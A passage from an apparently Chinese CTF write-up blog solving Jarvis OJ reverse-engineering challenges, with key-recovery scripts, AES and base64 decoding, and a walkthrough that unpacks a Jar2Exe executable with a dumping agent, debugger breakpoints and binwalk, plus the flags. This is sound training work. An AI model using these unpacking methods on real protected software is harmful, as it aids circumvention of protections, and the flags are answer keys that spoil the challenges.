class="number">211</span>, <span class="number">132</span>, <span class="number">160</span>, <span class="number">168</span>, <span class="number">154</span>, <span class="number">185</span>, <span class="number">183</span>, <span class="number">244</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">123</span>, <span class="number">28</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">210</span>, <span class="number">218</span>, <span class="number">47</span>, <span class="number">163</span>, <span class="number">215</span>, <span class="number">209</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">237</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">24</span>, <span class="number">234</span>, <span class="number">106</span>, <span class="number">143</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">136</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">193</span>, <span class="number">176</span>, <span class="number">225</span>, <span class="number">198</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">239</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">192</span>, <span class="number">11</span>, <span class="number">70</span>, <span class="number">58</span>, <span class="number">187</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">236</span>, <span class="number">230</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">190</span>, <span class="number">208</span>, <span class="number">207</span>, <span class="number">7</span>, <span class="number">53</span>, <span class="number">219</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">125</span>, <span class="number">164</span>, <span class="number">179</span>, <span class="number">175</span>, <span class="number">112</span>, <span class="number">172</span>, <span class="number">250</span>, <span class="number">133</span>, <span class="number">130</span>, <span class="number">52</span>, <span class="number">189</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">34</span>, <span class="number">157</span>, <span class="number">120</span>, <span class="number">195</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">142</span>, <span class="number">139</span>]</span><br><span class="line">pwda = [</span><br><span class="line"> <span class="number">188</span>, <span class="number">155</span>, <span class="number">11</span>, <span class="number">58</span>, <span class="number">251</span>, <span class="number">208</span>, <span class="number">204</span>, <span class="number">202</span>, <span class="number">150</span>, <span class="number">120</span>, <span class="number">206</span>, <span class="number">237</span>, <span class="number">114</span>, <span class="number">92</span>, <span class="number">126</span>, <span class="number">6</span>, <span class="number">42</span>]</span><br><span class="line">pwdb = [<span class="number">53</span>, <span class="number">222</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">67</span>, <span class="number">248</span>, <span class="number">226</span>, <span class="number">216</span>, <span class="number">17</span>, <span class="number">209</span>, <span class="number">32</span>, <span class="number">2</span>, <span class="number">181</span>, <span class="number">200</span>, <span class="number">171</span>, <span class="number">60</span>, <span class="number">108</span>]</span><br><span class="line">flag = raw_input(<span class="string">&#x27;Input your Key:&#x27;</span>).strip()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">17</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Wrong Key!!&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(flag[i]) + pwda[i] &amp; <span class="number">255</span> != lookup[(i + pwdb[i])]:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Wrong Key!!&#x27;</span></span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Congratulations!!&#x27;</span></span><br><span class="line"><span class="comment"># okay decompiling findkey.pyc</span></span><br></pre></td></tr></table></figure><p>则解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lookup = [</span><br><span class="line"> <span class="number">196</span>, <span class="number">153</span>, <span class="number">149</span>, <span class="number">206</span>, <span class="number">17</span>, <span class="number">221</span>, <span class="number">10</span>, <span class="number">217</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">36</span>, <span class="number">135</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">111</span>, <span class="number">31</span>, <span class="number">92</span>, <span class="number">152</span>, <span class="number">21</span>, <span class="number">228</span>, <span class="number">105</span>, <span class="number">191</span>, <span class="number">173</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">245</span>, <span class="number">23</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">246</span>, <span class="number">89</span>, <span class="number">178</span>, <span class="number">182</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">85</span>, <span class="number">48</span>, <span class="number">226</span>, <span class="number">165</span>, <span class="number">241</span>, <span class="number">166</span>, <span class="number">214</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">151</span>, <span class="number">3</span>, <span class="number">109</span>, <span class="number">169</span>, <span class="number">150</span>, <span class="number">224</span>, <span class="number">69</span>, <span class="number">156</span>, <span class="number">158</span>, <span class="number">57</span>, <span class="number">181</span>, <span class="number">29</span>, <span class="number">200</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">93</span>, <span class="number">65</span>, <span class="number">82</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">170</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">202</span>, <span class="number">107</span>, <span class="number">25</span>, <span class="number">73</span>, <span class="number">148</span>, <span class="number">98</span>, <span class="number">129</span>, <span class="number">231</span>, <span class="number">212</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">174</span>, <span class="number">171</span>, <span class="number">64</span>, <span class="number">180</span>, <span class="number">233</span>, <span class="number">74</span>, <span class="number">140</span>, <span class="number">242</span>, <span class="number">75</span>, <span class="number">104</span>, <span class="number">253</span>, <span class="number">44</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">55</span>, <span class="number">76</span>, <span class="number">35</span>, <span class="number">248</span>, <span class="number">96</span>, <span class="number">5</span>, <span class="number">56</span>, <span class="number">20</span>, <span class="number">161</span>, <span class="number">213</span>, <span class="number">238</span>, <span class="number">220</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">247</span>, <span class="number">8</span>, <span class="number">63</span>, <span class="number">249</span>, <span class="number">145</span>, <span class="number">243</span>, <span class="number">155</span>, <span class="number">222</span>, <span class="number">122</span>, <span class="number">32</span>, <span class="number">43</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">216</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">115</span>, <span class="number">138</span>, <span class="number">240</span>, <span class="number">147</span>, <span class="number">229</span>, <span class="number">204</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">141</span>, <span class="number">159</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">124</span>, <span class="number">254</span>, <span class="number">60</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">113</span>, <span class="number">79</span>, <span class="number">16</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">251</span>, <span class="number">40</span>, <span class="number">205</span>, <span class="number">137</span>, <span class="number">199</span>, <span class="number">83</span>, <span class="number">54</span>, <span class="number">188</span>, <span class="number">19</span>, <span class="number">184</span>, <span class="number">201</span>, <span class="number">110</span>, <span class="number">255</span>, <span class="number">26</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">132</span>, <span class="number">160</span>, <span class="number">168</span>, <span class="number">154</span>, <span class="number">185</span>, <span class="number">183</span>, <span class="number">244</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">123</span>, <span class="number">28</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">210</span>, <span class="number">218</span>, <span class="number">47</span>, <span class="number">163</span>, <span class="number">215</span>, <span class="number">209</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">237</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">24</span>, <span class="number">234</span>, <span class="number">106</span>, <span class="number">143</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">136</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">193</span>, <span class="number">176</span>, <span class="number">225</span>, <span class="number">198</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">239</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">192</span>, <span class="number">11</span>, <span class="number">70</span>, <span class="number">58</span>, <span class="number">187</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">236</span>, <span class="number">230</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">190</span>, <span class="number">208</span>, <span class="number">207</span>, <span class="number">7</span>, <span class="number">53</span>, <span class="number">219</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">125</span>, <span class="number">164</span>, <span class="number">179</span>, <span class="number">175</span>, <span class="number">112</span>, <span class="number">172</span>, <span class="number">250</span>, <span class="number">133</span>, <span class="number">130</span>, <span class="number">52</span>, <span class="number">189</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">34</span>, <span class="number">157</span>, <span class="number">120</span>, <span class="number">195</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">142</span>, <span class="number">139</span>]</span><br><span class="line">pwda = [</span><br><span class="line"> <span class="number">188</span>, <span class="number">155</span>, <span class="number">11</span>, <span class="number">58</span>, <span class="number">251</span>, <span class="number">208</span>, <span class="number">204</span>, <span class="number">202</span>, <span class="number">150</span>, <span class="number">120</span>, <span class="number">206</span>, <span class="number">237</span>, <span class="number">114</span>, <span class="number">92</span>, <span class="number">126</span>, <span class="number">6</span>, <span class="number">42</span>]</span><br><span class="line">pwdb = [<span class="number">53</span>, <span class="number">222</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">67</span>, <span class="number">248</span>, <span class="number">226</span>, <span class="number">216</span>, <span class="number">17</span>, <span class="number">209</span>, <span class="number">32</span>, <span class="number">2</span>, <span class="number">181</span>, <span class="number">200</span>, <span class="number">171</span>, <span class="number">60</span>, <span class="number">108</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([(lookup[(i + pwdb[i])] - pwda[i]) &amp; <span class="number">0xff</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>得flag: <code>PCTF&#123;PyC_Cr4ck3r&#125;</code></p><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>.Net架构, 用dnspy反编译, 找到目标函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021100813.png" alt="Jarvis_OJ Re CrackMe"></p><p>则解密脚本为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">&quot;UENURntFYTV5X0RvX05ldF9DcjRjazNyfQ==&quot;</span>))</span><br></pre></td></tr></table></figure><p>得到flag: <code>PCTF&#123;Ea5y_Do_Net_Cr4ck3r&#125;</code></p><h2 id="CrackMe2"><a href="#CrackMe2" class="headerlink" title="CrackMe2"></a>CrackMe2</h2><p>.Net架构, 用dnspy反编译，找到加密函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021101142.png" alt="20201021101142"></p><p>设断点进行调试，追溯到函数如下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021101244.png" alt="20201021101244"></p><p>则函数逻辑如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入进行AES加密再进行base64编码，最终跟一串常量进行对比</span><br></pre></td></tr></table></figure><p>常量可由动态调试得到</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021101456.png" alt="20201021101456"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">b&quot;pctf2016pctf2016pctf2016pctf2016&quot;</span></span><br><span class="line">obj = AES.new(key,AES.MODE_ECB)</span><br><span class="line">cipher = <span class="string">b&quot;x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk=&quot;</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">plaintext = obj.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><p>运行得flag: <code>PCTF&#123;Dot_Net_UnPack3r_yoo&#125;</code></p><h2 id="Fibinacii"><a href="#Fibinacii" class="headerlink" title="Fibinacii"></a>Fibinacii</h2><p>本题为用jar2exe打包的程序。jar2exe将java和jvm打包生成exe，从而可以在没有JAVA的机器上直接运行，原理是通过JNI的接口，创建JVM来执行封装的java代码，与exe4j将jar导出生成临时文件不同，jar2exe是在内部执行的，因此无法直接找到临时文件来反编译</p><p>用<a href="https://github.com/katjahahn/JWScan">jwscan.jar</a>可以检查出程序用什么打包</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">CTF</span>\<span class="title">Games</span>\<span class="title">Exam</span>\<span class="title">Jarvis</span>\<span class="title">Re</span>\<span class="title">Fibonacci</span>&gt;<span class="title">java</span> -<span class="title">jar</span> <span class="title">JWScan</span>\<span class="title">jwscan.jar</span> <span class="title">Fibonacci.exe</span></span></span><br><span class="line"><span class="function"><span class="title">JWScan</span> 0.2.1 -- <span class="title">by</span> <span class="title">Katja</span> <span class="title">Hahn</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">scanning</span> <span class="title">file</span> ...</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">file</span> <span class="title">name</span>: <span class="title">Fibonacci.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Signatures</span> <span class="title">found</span>:</span></span><br><span class="line"><span class="function">        * <span class="title">Jar2Exe.com</span> <span class="title">signature</span></span></span><br><span class="line"><span class="function">        * <span class="title">PZIP</span> <span class="title">Magic</span> <span class="title">Number</span> (<span class="title">weak</span> <span class="title">indication</span> <span class="title">for</span> <span class="title">embedded</span> <span class="title">zip</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ZIP</span>/<span class="title">Jar</span> <span class="title">offsets</span>: 0<span class="title">x72e6d</span></span></span><br></pre></td></tr></table></figure><p>归根到底依旧是Java, 那么仍然是通过JVM来执行字节码的JAVA, 而Jae2Exe的打包有三种等级, <code>No Hiding, No Encryption</code>, <code>Hidden Archive</code> 和 <code>Hidden Archive + Encrypted Class Names</code> 本题应该属于后两种</p><p>根据夜影师傅的博客，找到<a href="http://blog.csdn.net/ravinow/article/details/51123839">提取经过Jar2Exe编译加密的源代码 教程1</a>, 原理是通过java提供的javaagent接口，使得每个方法执行之前都先执行dump函数, 缺点就是没有被执行的方法就不会被dump了。</p><p>下载<a href="https://github.com/slavemaster/e2j%E7%9A%84e2j">https://github.com/slavemaster/e2j的e2j</a>后在所在目录下设置<code>set JAVA_TOOL_OPTIONS=-javaagent:e2j-agent.jar</code>即可</p><p>然后运行需要的程序，显示如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\CTF\Games\Exam\Jarvis\Re\Fibonacci&gt;Fibonacci.exe</span><br><span class="line">Picked up JAVA_TOOL_OPTIONS: -javaagent:e2j-agent.jar</span><br><span class="line">来让我们玩一个数列游戏：</span><br><span class="line">a[0]=0,a[1]=1</span><br><span class="line">a[2]=1,a[3]=2</span><br><span class="line">a[4]=3,a[5]=5</span><br><span class="line">..............</span><br><span class="line">请计算a[100000000000000]：</span><br><span class="line"></span><br><span class="line">答案错误！！</span><br></pre></td></tr></table></figure><p>目录下便产生了e2j-xxx.dump.jar, 拖入<code>jd-gui</code>得到所在类，但类b中因为没有方法，所以没有被JavaAgent抓到，因此得到的类是不完整的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.phrack.ctf.Fibonacci;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heheda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String hello = hello(<span class="keyword">new</span> String(b.y), <span class="keyword">new</span> String(b.x));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;来让我们玩一个数列游戏：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a[0]=0,a[1]=1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a[2]=1,a[3]=2&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a[4]=3,a[5]=5&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;..............&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请计算a[100000000000000]：&quot;</span>);</span><br><span class="line">        String nextLine = <span class="keyword">new</span> Scanner(System.in).nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;答案错误！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">hello</span><span class="params">(String aaa, String bbb)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            iS[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">256</span>; i2 = (<span class="keyword">short</span>) (i2 + <span class="number">1</span>)) &#123;</span><br><span class="line">            iK[i2] = (<span class="keyword">byte</span>) bbb.charAt(i2 % bbb.length());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i3 = <span class="number">0</span>; i3 &lt; <span class="number">255</span>; i3++) &#123;</span><br><span class="line">            j = ((iS[i3] + j) + iK[i3]) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> temp = iS[i3];</span><br><span class="line">            iS[i3] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span>[] iInputChar = aaa.toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> x = <span class="number">0</span>; x &lt; iInputChar.length; x = (<span class="keyword">short</span>) (x + <span class="number">1</span>)) &#123;</span><br><span class="line">            i4 = (i4 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            j2 = (iS[i4] + j2) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> temp2 = iS[i4];</span><br><span class="line">            iS[i4] = iS[j2];</span><br><span class="line">            iS[j2] = temp2;</span><br><span class="line">            iOutputChar[x] = (<span class="keyword">char</span>) (iInputChar[x] ^ ((<span class="keyword">char</span>) iS[(iS[i4] + (iS[j2] % <span class="number">256</span>)) % <span class="number">256</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后根据<a href="http://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html">http://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html</a>知道java代码被存放在RCDATA数据中， 因此只要找到RCDATA的数据位置，在程序运行过程中设置访问断点，当程序解密时找到解密后的代码位置即可得到相应的java代码</p><p>通过CFF_Explorer查到RCDATA的HEX数据</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021161811.png" alt="20201021161811"></p><p>通过x64dbg直接搜索对于的特征值，于<code>0x477398</code>找到</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021162236.png" alt="20201021162236"></p><p>设置内存访问断点，运行到解密循环</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021162642.png" alt="20201021162642"></p><p>根据代码逻辑大致可猜测R10指向的内存是JAVA的字节码，而R11就是范围了</p><p>使程序解密完成，即运行到<code>0x000000000041E713</code>, 使用scylla插件Dump内存， 保存为<code>1.jar</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021163833.png" alt="20201021163833"></p><p>使用binwalk进行分离文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Desktop binwalk -e 1.jar</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">544           0x220           Zip archive data, at least v2.0 to extract, compressed size: 66, uncompressed size: 73, name: b5f78a55</span><br><span class="line">668           0x29C           Zip archive data, at least v2.0 to extract, compressed size: 193, uncompressed size: 386, name: 98065b2b</span><br><span class="line">915           0x393           Zip archive data, at least v2.0 to extract, compressed size: 563, uncompressed size: 791, name: c7dce9e9</span><br><span class="line">1532          0x5FC           Zip archive data, at least v2.0 to extract, compressed size: 1389, uncompressed size: 2243, name: 1ab0208d</span><br></pre></td></tr></table></figure><p>其中有两个文件为标准的class文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Desktop file _1.jar.extracted/*</span><br><span class="line">_1.jar.extracted/1ab0208d: compiled Java class data, version 51.0 (Java 1.7)</span><br><span class="line">_1.jar.extracted/220.zip:  Java archive data (JAR)</span><br><span class="line">_1.jar.extracted/98065b2b: XML 1.0 document, ASCII text, with CRLF line terminators</span><br><span class="line">_1.jar.extracted/b5f78a55: ASCII text, with CRLF line terminators</span><br><span class="line">_1.jar.extracted/c7dce9e9: compiled Java class data, version 51.0 (Java 1.7)</span><br></pre></td></tr></table></figure><p>将这俩修改后缀名为<code>*.class</code>拖进jd-gui进行查看，其中<code>c7dce9e9.class</code>可以得到b类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.phrack.ctf.Fibonacci;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span>[] x = &#123;<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">16</span>, <span class="number">253</span>, <span class="number">201</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">205</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span>[] y = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="number">150</span>, <span class="number">174</span>, <span class="string">&#x27;D&#x27;</span>, <span class="number">180</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="number">214</span>, <span class="number">189</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="number">189</span>, <span class="number">217</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">199</span>, <span class="number">128</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">220</span>, <span class="number">222</span>, <span class="number">234</span>, <span class="number">11</span>, <span class="number">175</span>, <span class="number">228</span>, <span class="number">129</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么完整代码就有了，这题跟斐波那契数列一点关系都没有，cv工程师上线，写个java代码编译运行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Fibonacci fibonacci = <span class="keyword">new</span> Fibonacci();</span><br><span class="line">        System.out.println(fibonacci.heheda());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">heheda</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String bb = <span class="keyword">new</span> String(b.x);</span><br><span class="line">        String cb = <span class="keyword">new</span> String(b.y);</span><br><span class="line">        String m = hello(cb, bb);</span><br><span class="line">        <span class="keyword">return</span> m;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">hello</span><span class="params">(String aaa, String bbb)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            iS[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i = (<span class="keyword">short</span>)(i + <span class="number">1</span>)) &#123;</span><br><span class="line">            iK[i] = ((<span class="keyword">byte</span>)bbb.charAt(i % bbb.length()));</span><br><span class="line">        &#125;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            j = (j + iS[i] + iK[i]) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> temp = iS[i];</span><br><span class="line">            iS[i] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span>[] iInputChar = aaa.toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> x = <span class="number">0</span>; x &lt; iInputChar.length; x = (<span class="keyword">short</span>)(x + <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            j = (j + iS[i]) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> temp = iS[i];</span><br><span class="line">            iS[i] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">            <span class="keyword">int</span> t = (iS[i] + iS[j] % <span class="number">256</span>) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> iY = iS[t];</span><br><span class="line">            <span class="keyword">char</span> iCY = (<span class="keyword">char</span>)iY;</span><br><span class="line">            iOutputChar[x] = ((<span class="keyword">char</span>)(iInputChar[x] ^ iCY));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">b</span> 